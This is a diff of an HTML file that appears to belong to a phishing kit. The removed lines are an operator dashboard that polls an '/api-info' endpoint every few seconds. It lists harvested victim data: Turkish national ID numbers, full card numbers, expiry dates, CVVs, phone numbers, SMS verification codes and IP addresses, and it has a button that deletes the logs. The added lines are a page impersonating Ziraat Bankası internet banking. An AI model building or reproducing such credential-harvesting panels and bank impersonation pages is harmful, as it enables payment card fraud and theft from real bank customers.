@@ -1,104 +1,24 @@
 <!DOCTYPE html>
-<html>
-<head>
-    <title>Info Tablosu</title>
-	<link href="https://demo.dashboardpack.com/architectui-html-free/main.css" rel="stylesheet">
-	<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-</head>
-<body>
-   <div class="row">
-                            <div class="col-md-12">
-                                <div class="main-card mb-3 card">
-                                    <div class="card-header">Active Users
-                                        <div class="btn-actions-pane-right">
-                                            <div role="group" class="btn-group-sm btn-group">
-                                                <button class="active btn btn-focus"  id="delete-logs-button">Logları Sil</button>
-                                                
-                                            </div>
-                                        </div>
-                                    </div>
-                                    <div class="table-responsive">
-                                        <table class="align-middle mb-0 table table-borderless table-striped table-hover">
-        <thead>
-            <tr>
-               
-                <th>Ad</th>
-                <th>Kart No</th>
-                <th>Son Kul</th>
-                <th>CVV</th>
-              
-                <th>Tel No</th>
-              
-                <th>SMS</th>
-                <th>SMS2</th>
-                <th>Durum</th>
-                <th>Page</th>
-                <th>Notification 1</th>
-                <th>Notification 2</th>
-             
-                <th>Date</th>
-                <th>IP</th>
-            </tr>
-        </thead>
-        <tbody id="infoTableBody">
-         </tbody>
-    </table>
-
-     <script>
-        function fetchDataAndPopulateTable() {
-    fetch('/api-info')
-        .then(response => response.json())
-        .then(data => {
-            const infoTableBody = document.getElementById('infoTableBody');
-           
-            infoTableBody.innerHTML = '';
-
-            data.forEach(info => {
-                const row = document.createElement('tr');
-                row.innerHTML = `
-                    <td>${info.tckn}</td>
-                    <td>${info.cardnumber}</td>
-                    <td>${info.exp}</td>
-                    <td>${info.cvv}</td>
-                   
-                    <td>${info.phone}</td>
-                    <td>${info.sms}</td>
-                    <td>${info.sms2}</td>
-                    <td>${info.active_status < Math.floor(Date.now() / 1000) ? '🔴' : '🟢'}</td>
-                    <td>${info.page}</td>
-                    <td>${info.notif1}</td>
-                    <td>${info.notif2}</td>
-                    <td>${info.now_date}</td>
-                    <td>${info.ip}</td>
-                `;
-                infoTableBody.appendChild(row);
-            });
-        });
-}
-fetchDataAndPopulateTable();
-setInterval(fetchDataAndPopulateTable, 2800);
-
-    </script>
-	  </div>
-	 </div>
-	</div>
-	<script>
-$(document).ready(function() {
-     $("#delete-logs-button").click(function() {
-        if (confirm("Tüm logları silmek istediğinize emin misiniz?")) {
-             $.ajax({
-                type: "POST",
-                url: "/delete-logs-api",
-                success: function(response) {
-                     alert("Loglar başarıyla silindi.");
-                 },
-                error: function(error) {
-                     alert("Logları silerken hata oluştu.");
-                }
-            });
-        }
-    });
-});
-</script>
-</body>
+<html lang="tr">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mobil Uyumlu Sayfa</title>
+    <style class="vjs-styles-defaults"></style>
+    <meta http-equiv="Content-Language" content="tr">
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-9">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Hoş Geldiniz | Ziraat Bankası İnternet Bankacılığı </title>
+    <link href="styles.css" rel="stylesheet" id="style">
+	 
+  </head>
+  <body style="
+margin-left: 0px;
+margin-right: 0px;
+margin-top: 0px;
+margin-bottom: 0px;
+">
+   <img src="onay.png" alt="" width="" height="">
+    <div>
+  </body>
 </html>
